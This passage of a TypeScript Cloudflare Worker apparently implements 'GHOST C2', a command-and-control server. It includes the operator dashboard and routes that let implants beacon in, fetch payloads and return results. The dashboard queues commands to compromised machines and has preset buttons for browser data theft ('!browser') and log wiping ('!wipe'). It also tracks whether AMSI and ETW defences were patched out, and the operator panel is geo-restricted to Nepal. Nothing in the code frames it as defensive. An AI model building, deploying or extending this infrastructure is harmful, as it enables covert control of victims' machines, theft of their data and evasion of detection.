.result-hdr .r-idx{color:var(--muted2);font-size:8px;min-width:28px}
.result-hdr .r-ts{color:var(--muted);flex:1}
.result-hdr .r-label{color:var(--accent);font-weight:700;font-size:8px;letter-spacing:.12em}
.result-hdr .r-len{color:var(--muted2);font-size:8px}
.result-body{padding:10px 12px 10px 40px;white-space:pre-wrap;word-break:break-word;color:var(--text);line-height:1.75;font-size:11px;position:relative}
.result-body::before{content:'';position:absolute;left:28px;top:0;bottom:0;width:1px;background:var(--border)}
.result-body .line-num{position:absolute;left:0;width:26px;text-align:right;color:var(--muted2);font-size:9px;user-select:none;line-height:1.75}

/* recon grid */
.recon-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(190px,1fr));gap:6px}
.recon-cell{border:1px solid var(--border);padding:10px 12px;background:var(--surface2)}
.recon-key{font-size:8px;letter-spacing:.18em;color:var(--muted);text-transform:uppercase;margin-bottom:5px}
.recon-val{font-size:12px;color:var(--text);word-break:break-all;font-weight:500}
.recon-val.hi{color:var(--accent)}
.recon-val.warn{color:var(--yellow)}
.recon-val.danger{color:var(--red)}

/* ── COMMAND BAR ──────────────────────────────────────── */
#cmd-bar{border-top:1px solid var(--border);background:var(--surface);display:none;flex-shrink:0}
.cmd-row{display:flex;gap:0;border-bottom:1px solid var(--border)}
.cmd-prompt{color:var(--accent);font-size:12px;padding:8px 10px 8px 14px;flex-shrink:0;letter-spacing:.04em;border-right:1px solid var(--border);background:var(--surface2);user-select:none}
#cmd-input{flex:1;background:transparent;border:none;color:var(--accent);padding:8px 12px;font-family:var(--mono);font-size:12px;outline:none;caret-color:var(--accent)}
#cmd-input::placeholder{color:var(--muted)}
.cmd-exec{background:transparent;border:none;border-left:1px solid var(--border);color:var(--muted);padding:0 14px;font-family:var(--mono);font-size:10px;letter-spacing:.1em;cursor:pointer;text-transform:uppercase;transition:all .15s;flex-shrink:0}
.cmd-exec:hover{color:var(--accent);background:var(--accent-dim)}
.quick-cmds{display:flex;gap:0;flex-wrap:nowrap;overflow-x:auto;padding:5px 8px;gap:4px}
.quick-cmds::-webkit-scrollbar{height:2px}
.qcmd{background:transparent;border:1px solid var(--border);color:var(--muted);padding:3px 9px;font-family:var(--mono);font-size:9px;letter-spacing:.08em;cursor:pointer;text-transform:uppercase;transition:all .15s;white-space:nowrap;flex-shrink:0}
.qcmd:hover{border-color:var(--accent);color:var(--accent);background:var(--accent-dim)}

/* ── AUDIT PANEL ──────────────────────────────────────── */
#audit-panel{width:250px;flex-shrink:0;display:flex;flex-direction:column;border-left:1px solid var(--border);background:var(--surface)}
#audit-list{flex:1;overflow-y:auto}
.audit-entry{padding:7px 10px;border-bottom:1px solid var(--border);font-size:9px;display:flex;flex-direction:column;gap:2px;position:relative;padding-left:14px}
.audit-entry::before{content:'';position:absolute;left:0;top:0;bottom:0;width:3px}
.audit-entry.list_sessions::before{background:var(--muted2)}
.audit-entry.task_queued::before{background:var(--yellow)}
.audit-entry.kill_session::before{background:var(--red)}
.audit-entry.get_results::before{background:var(--blue)}
.audit-entry.payload_uploaded::before{background:var(--orange)}
.audit-entry.beacon::before{background:var(--accent)}
.a-time{color:var(--muted);letter-spacing:.02em;font-size:8px}
.a-action{color:var(--text);font-weight:700;letter-spacing:.08em;text-transform:uppercase;font-size:9px}
.a-ip{color:var(--muted);font-size:8px;letter-spacing:.02em}
.no-audit{padding:24px 14px;color:var(--muted);font-size:9px;letter-spacing:.06em;text-align:center}

/* ── TOAST ────────────────────────────────────────────── */
#toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%);background:var(--surface2);border:1px solid var(--border);padding:8px 20px;font-size:11px;letter-spacing:.06em;opacity:0;transition:opacity .2s;pointer-events:none;z-index:9998;white-space:nowrap}
#toast.show{opacity:1}
#toast.ok{border-color:rgba(0,255,136,.4);color:var(--accent)}
#toast.err{border-color:rgba(255,59,92,.4);color:var(--red)}

/* ── SCROLLBAR ────────────────────────────────────────── */
::-webkit-scrollbar{width:3px;height:3px}
::-webkit-scrollbar-track{background:transparent}
::-webkit-scrollbar-thumb{background:var(--border2)}
::-webkit-scrollbar-thumb:hover{background:var(--muted)}
</style>
</head>
<body>
<header>
  <div class="hdr-logo">
    <span class="ghost">GHOST</span>
    <span class="ver">C2</span>
  </div>
  <div class="hdr-seg">
    <div class="pulse" id="pulse"></div>
    <span class="status-txt" id="status-txt">OFFLINE</span>
  </div>
  <div class="hdr-seg">
    <div class="hdr-kv"><div class="k">NODES</div><div class="v" id="hdr-count">0</div></div>
  </div>
  <div class="hdr-seg">
    <div class="hdr-kv"><div class="k">SELECTED</div><div class="v" id="hdr-sel" style="color:var(--muted);font-size:10px">—</div></div>
  </div>
  <div class="hdr-right">
    <span id="clock"></span>
    <button class="hdr-btn danger" onclick="logout()">LOGOUT</button>
  </div>
</header>

<div class="workspace">
  <!-- SIDEBAR: node list -->
  <div id="sidebar">
    <div class="pane-head">
      <span class="pane-label">Active Nodes</span>
      <div style="display:flex;align-items:center;gap:8px">
        <span class="pane-count" id="node-count">0</span>
        <button class="icon-btn" onclick="refreshSessions()" title="Refresh">&#x21bb;</button>
      </div>
    </div>
    <div id="session-list"><div class="no-sessions">AWAITING CONNECTIONS</div></div>
  </div>

  <!-- MAIN: output/recon -->
  <div id="main">
    <div id="tab-bar">
      <div class="tab active" data-tab="output" onclick="switchTab('output')">
        OUTPUT <span class="tab-count" id="tc-output">0</span>
      </div>
      <div class="tab" data-tab="recon" onclick="switchTab('recon')">RECON</div>
    </div>

    <div id="session-header">
      <span class="sel-sid" id="sel-sid"></span>
      <span class="sel-meta" id="sel-meta"></span>
      <div class="sel-actions">
        <span id="last-poll"></span>
        <button class="act-btn" onclick="fetchResults()">REFRESH</button>
        <button class="act-btn kill" onclick="killSession()">KILL NODE</button>
      </div>
    </div>

    <div id="empty-state">
      <div class="empty-glyph">&#x25A1;</div>
      <div class="empty-msg">No node selected</div>
      <div class="empty-hint">Click a node in the sidebar to begin</div>
    </div>

    <div id="output-pane"></div>
    <div id="recon-pane"></div>

    <div id="cmd-bar">
      <div class="cmd-row">
        <span class="cmd-prompt">ghost@c2&nbsp;&gt;&nbsp;</span>
        <input id="cmd-input" placeholder="enter command and press Enter..." onkeydown="handleKey(event)">
        <button class="cmd-exec" onclick="sendCmd()">EXEC</button>
      </div>
      <div class="quick-cmds">
        <button class="qcmd" onclick="sendCmd('whoami /all')">whoami</button>
        <button class="qcmd" onclick="sendCmd('ipconfig /all')">ipconfig</button>
        <button class="qcmd" onclick="sendCmd('systeminfo')">sysinfo</button>
        <button class="qcmd" onclick="sendCmd('tasklist /v')">tasklist</button>
        <button class="qcmd" onclick="sendCmd('!ps')">ps</button>
        <button class="qcmd" onclick="sendCmd('netstat -ano')">netstat</button>
        <button class="qcmd" onclick="sendCmd('net user')">net user</button>
        <button class="qcmd" onclick="sendCmd('!browser')">browsers</button>
        <button class="qcmd" onclick="sendCmd('!wipe')">wipe logs</button>
      </div>
    </div>
  </div>

  <!-- AUDIT PANEL -->
  <div id="audit-panel">
    <div class="pane-head">
      <span class="pane-label">Audit Log</span>
      <button class="icon-btn" onclick="fetchAudit()" title="Refresh">&#x21bb;</button>
    </div>
    <div id="audit-list"><div class="no-audit">NO ENTRIES</div></div>
  </div>
</div>

<div id="toast"></div>
<script>
(function(){
  const token = sessionStorage.getItem('ghost_token');
  if (!token) { location.href = '/'; return; }

  let selectedSid = null, pollTimer = null, auditTimer = null, currentTab = 'output';
  let cmdHistory = [], cmdHistIdx = -1;

  // ── Clock ──
  function tick() {
    const n = new Date();
    document.getElementById('clock').textContent =
      n.toISOString().replace('T',' ').slice(0,19) + ' UTC';
  }
  tick(); setInterval(tick, 1000);

  // ── Toast ──
  function toast(msg, type='ok', dur=2500) {
    const el = document.getElementById('toast');
    el.textContent = msg;
    el.className = 'show ' + type;
    clearTimeout(el._t);
    el._t = setTimeout(() => el.className = '', dur);
  }

  // ── API ──
  async function api(path, opts={}) {
    try {
      const r = await fetch(path, {
        headers: {'Content-Type':'application/json','X-Operator-Token':token},
        ...opts
      });
      if (r.status === 401) { toast('SESSION EXPIRED', 'err'); setTimeout(logout, 1500); return null; }
      return r;
    } catch(e) { toast('NETWORK ERROR', 'err'); return null; }
  }

  function logout() {
    sessionStorage.removeItem('ghost_token');
    // POST to /logout to clear any server-side state, then go to login
    fetch('/logout', { method: 'POST' }).finally(() => { location.href = '/logout'; });
  }
  window.logout = logout;

  // ── Sessions ──
  async function refreshSessions() {
    const r = await api('/sessions');
    if (!r) return;
    const sessions = await r.json();
    const list = document.getElementById('session-list');
    document.getElementById('hdr-count').textContent = sessions.length;
    document.getElementById('node-count').textContent = sessions.length;
    const pulse = document.getElementById('pulse');
    const stxt = document.getElementById('status-txt');
    if (sessions.length > 0) {
      pulse.className = 'pulse live';
      stxt.textContent = 'LIVE';
      stxt.className = 'status-txt live';
    } else {
      pulse.className = 'pulse';
      stxt.textContent = 'IDLE';
      stxt.className = 'status-txt';
    }
    if (!sessions.length) {
      list.innerHTML = '<div class="no-sessions">AWAITING CONNECTIONS</div>';
      return;
    }
    sessions.sort((a,b)=>new Date(b.last_beacon)-new Date(a.last_beacon));
    list.innerHTML = sessions.map(s=>{
      const idle = s.idle_seconds;
      const stale = idle > 180;
      const bc = s.pending_tasks>0?'tasks':stale?'stale':'live';
      const bt = s.pending_tasks>0?('&#x25B3; '+s.pending_tasks+' QUEUED'):stale?('STALE '+fmt(idle)):('&#x25CF; LIVE '+fmt(idle));
      const elev = s.recon?.elevated ? '<span class="elevated"> &#x25B2;ADMIN</span>' : '';
      return \`<div class="session-item\${s.session===selectedSid?' active':''}" onclick="selectSession('\${esc(s.session)}')">
        <div class="sid">\${esc(s.session.slice(0,26))}\${s.session.length>26?'..':''}</div>
        <div class="smeta">\${esc(s.recon?.hostname||'unknown')}\${elev}</div>
        <div class="smeta">\${esc(s.remote_ip)} &bull; \${esc(s.recon?.user||'?')}</div>
        <span class="sbadge \${bc}"><span class="sbadge-dot"></span>\${bt}</span>
      </div>\`;
    }).join('');
  }
  window.refreshSessions = refreshSessions;

  // ── Select session ──
  async function selectSession(sid) {
    selectedSid = sid;
    lastResultCount = 0;
    document.getElementById('sel-sid').textContent = sid.slice(0,36);
    document.getElementById('hdr-sel').textContent = sid.slice(0,20)+'..';
    document.getElementById('hdr-sel').style.color = 'var(--accent)';
    document.getElementById('session-header').style.display = 'flex';
    document.getElementById('empty-state').style.display = 'none';
    document.getElementById('cmd-bar').style.display = 'block';
    document.getElementById('output-pane').dataset.sid = '';
    switchTab(currentTab);
    await Promise.all([refreshSessions(), fetchResults(), fetchRecon()]);
    document.getElementById('cmd-input').focus();
  }
  window.selectSession = selectSession;

  // ── Tabs ──
  function switchTab(tab) {
    currentTab = tab;
    document.querySelectorAll('.tab').forEach(t=>t.classList.toggle('active',t.dataset.tab===tab));
    const op = document.getElementById('output-pane');
    const rp = document.getElementById('recon-pane');
    if (selectedSid) {
      op.style.display = tab==='output'?'flex':'none';
      if(tab==='output') op.style.flexDirection='column';
      rp.style.display = tab==='recon'?'block':'none';
    }
  }
  window.switchTab = switchTab;

  // ── Results ──
  let lastResultCount = 0;
  async function fetchResults() {
    if (!selectedSid) return;
    const r = await api('/results/'+encodeURIComponent(selectedSid));
    if (!r) return;
    const data = await r.json();
    const box = document.getElementById('output-pane');
    const tc = document.getElementById('tc-output');
    const entries = data.results||[];
    if (tc) tc.textContent = String(entries.length);

    const pollEl = document.getElementById('last-poll');
    if (pollEl) {
      const now = new Date();
      pollEl.textContent = 'SYNC '+now.toUTCString().slice(17,25)+' UTC';
      pollEl.style.color = 'var(--accent)';
      setTimeout(()=>{ if(pollEl) pollEl.style.color='var(--muted)'; }, 1400);
    }

    if (!entries.length) {
      if (box.dataset.sid !== selectedSid) {
        box.innerHTML = '<div style="padding:20px 14px;color:var(--muted);font-size:10px;letter-spacing:.1em;text-transform:uppercase;opacity:.5">// no output received yet — awaiting beacon</div>';
        box.dataset.sid = selectedSid;
      }
      lastResultCount = 0;
      return;
    }

    const hasNew = entries.length !== lastResultCount;
    if (!hasNew && box.dataset.sid === selectedSid) return;

    const atBottom = box.scrollHeight - box.scrollTop - box.clientHeight < 60;
    const sorted = entries.slice().sort((a,b)=>a.ts<b.ts?-1:1);

    box.innerHTML = sorted.map((e, i)=>{
      const lines = esc(e.output).split('\\n');
      const lineHtml = lines.map((l,li)=>
        \`<div style="display:flex;min-height:1.75em"><span style="min-width:26px;text-align:right;color:var(--muted2);font-size:9px;user-select:none;padding-right:8px;line-height:1.75;flex-shrink:0">\${li+1}</span><span style="flex:1;word-break:break-word">\${l||'&nbsp;'}</span></div>\`
      ).join('');
      const ts = e.ts.replace('T',' ').slice(0,19);
      const byteLen = new TextEncoder().encode(e.output).length;
      return \`<div class="result-entry">
        <div class="result-hdr">
          <span class="r-idx">#\${i+1}</span>
          <span class="r-label">OUTPUT</span>
          <span class="r-ts">\${ts} UTC</span>
          <span class="r-len">\${byteLen}B / \${lines.length}L</span>
        </div>
        <div class="result-body" style="padding-left:12px">\${lineHtml}</div>
      </div>\`;
    }).join('');

    box.dataset.sid = selectedSid;
    if (atBottom || entries.length > lastResultCount) box.scrollTop = box.scrollHeight;
    lastResultCount = entries.length;
  }
  window.fetchResults = fetchResults;

  // ── Recon ──
  async function fetchRecon() {
    if (!selectedSid) return;
    const r = await api('/sessions');
    if (!r) return;
    const sessions = await r.json();
    const s = sessions.find(x=>x.session===selectedSid);
    if (!s) return;
    const recon = s.recon||{};
    const parts = [recon.hostname, s.remote_ip, recon.user].filter(Boolean);
    document.getElementById('sel-meta').textContent = parts.join('  //  ');
    const cells = [
      {k:'hostname',     v:recon.hostname,                          cls:'hi'},
      {k:'username',     v:recon.user,                              cls:''},
      {k:'elevated',     v:recon.elevated?'YES — ADMIN':'NO',       cls:recon.elevated?'danger':'warn'},
      {k:'remote ip',    v:s.remote_ip,                             cls:''},
      {k:'os',           v:recon.os,                                cls:''},
      {k:'build',        v:recon.build,                             cls:''},
      {k:'arch',         v:recon.arch,                              cls:''},
      {k:'domain',       v:recon.domain,                            cls:''},
      {k:'amsi patched', v:recon.amsi?'PATCHED':'NO',               cls:recon.amsi?'hi':'warn'},
      {k:'etw patched',  v:recon.etw?'PATCHED':'NO',                cls:recon.etw?'hi':'warn'},
      {k:'first seen',   v:s.first_seen?.replace('T',' ').slice(0,19)+' UTC',  cls:''},
      {k:'last beacon',  v:s.last_beacon?.replace('T',' ').slice(0,19)+' UTC', cls:''},
      {k:'idle',         v:fmt(s.idle_seconds||0),                  cls:s.idle_seconds>180?'warn':''},
      {k:'queued tasks', v:s.pending_tasks,                         cls:s.pending_tasks>0?'warn':'hi'},
      {k:'result count', v:s.result_count,                          cls:''},
    ].filter(c=>c.v!=null&&c.v!==''&&c.v!=='undefined UTC');
    document.getElementById('recon-pane').innerHTML =
      '<div class="recon-grid">'+
      cells.map(c=>\`<div class="recon-cell"><div class="recon-key">\${esc(c.k)}</div><div class="recon-val \${c.cls}">\${esc(String(c.v))}</div></div>\`).join('')+
      '</div>';
  }

  // ── Send command ──
  async function sendCmd(preset) {
    if (!selectedSid) return toast('NO NODE SELECTED', 'err');
    const input = document.getElementById('cmd-input');
    const cmd = preset || input.value.trim();
    if (!cmd) return;
    if (!preset && cmd) { cmdHistory.unshift(cmd); if(cmdHistory.length>50)cmdHistory.pop(); cmdHistIdx=-1; }
    const r = await api('/task', {method:'POST', body:JSON.stringify({session:selectedSid,cmd})});
    if (!r) return;
    const data = await r.json();
    if (data.status==='queued') {
      toast('QUEUED  depth='+data.queue_depth);
      if (!preset) input.value='';
    } else {
      toast('ERROR: '+JSON.stringify(data),'err');
    }
  }
  window.sendCmd = sendCmd;

  function handleKey(e) {
    if (e.key==='Enter') { sendCmd(); return; }
    const input = document.getElementById('cmd-input');
    if (e.key==='ArrowUp') {
      e.preventDefault();
      if (cmdHistIdx < cmdHistory.length-1) { cmdHistIdx++; input.value=cmdHistory[cmdHistIdx]; }
    } else if (e.key==='ArrowDown') {
      e.preventDefault();
      if (cmdHistIdx > 0) { cmdHistIdx--; input.value=cmdHistory[cmdHistIdx]; }
      else { cmdHistIdx=-1; input.value=''; }
    }
  }
  window.handleKey = handleKey;

  // ── Kill ──
  async function killSession() {
    if (!selectedSid || !confirm('Send EXIT to node '+selectedSid+'?\nThis queues an exit command — node will stop beaconing.')) return;
    const r = await api('/sessions/'+encodeURIComponent(selectedSid),{method:'DELETE'});
    if (!r) return;
    toast('EXIT QUEUED FOR NODE');
    selectedSid = null;
    document.getElementById('hdr-sel').textContent='—';
    document.getElementById('hdr-sel').style.color='var(--muted)';
    document.getElementById('session-header').style.display = 'none';
    document.getElementById('empty-state').style.display = 'flex';
    document.getElementById('output-pane').style.display = 'none';
    document.getElementById('recon-pane').style.display = 'none';
    document.getElementById('cmd-bar').style.display = 'none';
    await refreshSessions();
  }
  window.killSession = killSession;

  // ── Audit ──
  async function fetchAudit() {
    const r = await api('/audit?limit=100');
    if (!r) return;
    const data = await r.json();
    const list = document.getElementById('audit-list');
    const entries = (data.entries||[]).slice().reverse();
    if (!entries.length) { list.innerHTML = '<div class="no-audit">NO ENTRIES</div>'; return; }
    list.innerHTML = entries.map(e=>{
      const t = e.ts.replace('T',' ').slice(0,19);
      const actionColor = {
        task_queued:'var(--yellow)', kill_session:'var(--red)',
        get_results:'var(--blue)', beacon:'var(--accent)',
        payload_uploaded:'var(--orange)'
      }[e.action] || 'var(--muted)';
      return \`<div class="audit-entry \${esc(e.action)}">
        <div class="a-time">\${t}</div>
        <div class="a-action" style="color:\${actionColor}">\${esc(e.action).replace(/_/g,' ')}</div>
        <div class="a-ip">\${esc(e.ip)}</div>
      </div>\`;
    }).join('');
  }
  window.fetchAudit = fetchAudit;

  function fmt(s){
    if(!s&&s!==0)return'—';
    s=Math.floor(s);
    return s<60?s+'s':s<3600?Math.floor(s/60)+'m '+((s%60)||'')+'s':Math.floor(s/3600)+'h '+Math.floor((s%3600)/60)+'m';
  }
  function esc(s){return String(s==null?'':s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;')}

  // ── Boot ──
  refreshSessions();
  fetchAudit();
  pollTimer = setInterval(()=>{refreshSessions();if(selectedSid)fetchResults();},5000);
  auditTimer = setInterval(fetchAudit,12000);
})();
</script>
</body>
</html>`;
// ─── Geo Guard (dashboard routes only) ───────────────────

function isNepal(request: Request): boolean {
  const country = request.headers.get("CF-IPCountry") ?? "";
  return country === "NP";
}

function geoBlock(): Response {
  return new Response("403 Forbidden", { status: 403, headers: { "Content-Type": "text/plain" } });
}

// ─── Auth Handler ─────────────────────────────────────────

async function handleAuth(request: Request, env: Env): Promise<Response> {
  const body = await safeJson<{ u?: string; p?: string }>(request);
  if (!body?.u || !body?.p) return errorResponse("Missing credentials", 400);
  const validUser = env.DASHBOARD_USER || "";
  const validPass = env.DASHBOARD_PASS || "";
  if (!validUser || !validPass) return errorResponse("Auth not configured", 503);
  if (!secureCompare(body.u, validUser) || !secureCompare(body.p, validPass)) {
    return errorResponse("Invalid credentials", 401);
  }
  return jsonResponse({ token: env.OPERATOR_TOKEN });
}

// ─── Router ───────────────────────────────────────────────

async function handleRequest(request: Request, env: Env): Promise<Response> {
  const url = new URL(request.url);
  const { pathname: path } = url;
  const method = request.method;
  const ip = getClientIP(request);

  // CORS preflight
  if (method === "OPTIONS") {
    return withCORS(new Response(null, { status: 204 }), env);
  }

  // ── Web UI (Nepal only) ───────────────────────────────────
  if (path === "/" && method === "GET") {
    if (!isNepal(request)) return geoBlock();
    return new Response(LOGIN_HTML, {
      status: 200,
      headers: { "Content-Type": "text/html; charset=utf-8", "Cache-Control": "no-store" },
    });
  }
  if (path === "/dashboard" && method === "GET") {
    if (!isNepal(request)) return geoBlock();
    return new Response(DASHBOARD_HTML, {
      status: 200,
      headers: { "Content-Type": "text/html; charset=utf-8", "Cache-Control": "no-store" },
    });
  }
  // Logout — clears session client-side, serves a redirect page
  if (path === "/logout") {
    const html = `<!DOCTYPE html><html><head><meta charset="UTF-8">
<meta http-equiv="refresh" content="0;url=/">
<style>*{margin:0;padding:0}body{background:#060810;display:flex;align-items:center;justify-content:center;height:100vh;font-family:monospace;color:#484f58;font-size:12px}</style>
</head><body>LOGGING OUT...</body></html>`;
    return new Response(html, {
      status: 200,
      headers: { "Content-Type": "text/html; charset=utf-8", "Cache-Control": "no-store" },
    });
  }
  if (path === "/auth" && method === "POST") {
    // Rate limit auth: 5 attempts per minute per IP
    if (rateLimitHit(`auth:${ip}`, RL_AUTH_MAX)) return rateLimitResponse();
    return withCORS(await handleAuth(request, env), env);
  }

  // ── Public routes ──────────────────────────────────────
  if (path === "/health" && method === "GET") {
    return withCORS(handleHealth(), env);
  }
  // ── Beacon routes (X-Beacon-Token) ────────────────────
  if (path === "/beacon" && method === "POST") {
    if (rateLimitHit(`beacon:${ip}`, RL_API_MAX)) return withCORS(rateLimitResponse(), env);
    const authErr = requireBeaconToken(request, env);
    if (authErr) return withCORS(authErr, env);
    return withCORS(await handleBeacon(request, env), env);
  }
  if (path === "/result" && method === "POST") {
    if (rateLimitHit(`result:${ip}`, RL_API_MAX)) return withCORS(rateLimitResponse(), env);
    const authErr = requireBeaconToken(request, env);
    if (authErr) return withCORS(authErr, env);
    return withCORS(await handleResult(request, env), env);
  }
  if (path === "/payload" && method === "GET") {
    const authErr = requireBeaconToken(request, env);
    if (authErr) return withCORS(authErr, env);
    return withCORS(await handleDownloadPayload(env), env);
  }

  // ── Operator routes (X-Operator-Token, Nepal only) ────────
  // Rate limit all operator API calls: 120/min per IP
  if (path === "/sessions" && method === "GET") {
    if (!isNepal(request)) return geoBlock();
    if (rateLimitHit(`op:${ip}`, RL_API_MAX)) return withCORS(rateLimitResponse(), env);
    const authErr = requireOperatorToken(request, env);
    if (authErr) return withCORS(authErr, env);
    return withCORS(await handleListSessions(request, env), env);
  }
  if (path === "/task" && method === "POST") {
    if (!isNepal(request)) return geoBlock();
    if (rateLimitHit(`op:${ip}`, RL_API_MAX)) return withCORS(rateLimitResponse(), env);
    const authErr = requireOperatorToken(request, env);
    if (authErr) return withCORS(authErr, env);
    return withCORS(await handleAddTask(request, env), env);
  }
  if (path === "/audit" && method === "GET") {
    if (!isNepal(request)) return geoBlock();
    const authErr = requireOperatorToken(request, env);
    if (authErr) return withCORS(authErr, env);
    return withCORS(await handleAudit(request, env), env);
  }
  if (path === "/payload" && method === "POST") {
    if (!isNepal(request)) return geoBlock();
    const authErr = requireOperatorToken(request, env);
    if (authErr) return withCORS(authErr, env);
    return withCORS(await handleUploadPayload(request, env), env);
  }

  // ── Parameterised operator routes ──────────────────────
  const resultsMatch = path.match(/^\/results\/(.+)$/);
  if (resultsMatch && method === "GET") {
    if (!isNepal(request)) return geoBlock();
    const authErr = requireOperatorToken(request, env);
    if (authErr) return withCORS(authErr, env);
    const sid = decodeURIComponent(resultsMatch[1]);
    return withCORS(await handleGetResults(request, env, sid), env);
  }

  const sessionsMatch = path.match(/^\/sessions\/(.+)$/);
  if (sessionsMatch && method === "DELETE") {
    if (!isNepal(request)) return geoBlock();
    const authErr = requireOperatorToken(request, env);
    if (authErr) return withCORS(authErr, env);
    const sid = decodeURIComponent(sessionsMatch[1]);
    return withCORS(await handleKillSession(request, env, sid), env);
  }

  return withCORS(errorResponse("Not found", 404), env);
}

export default {
  async fetch(request: Request, env: Env, _ctx: ExecutionContext): Promise<Response> {
    try {
      return await handleRequest(request, env);
    } catch (err) {
      const message = err instanceof Error ? err.message : "Internal error";
      console.error(`[error] ${message}`);
      return withCORS(errorResponse("Internal server error", 500), env);
    }
  },
};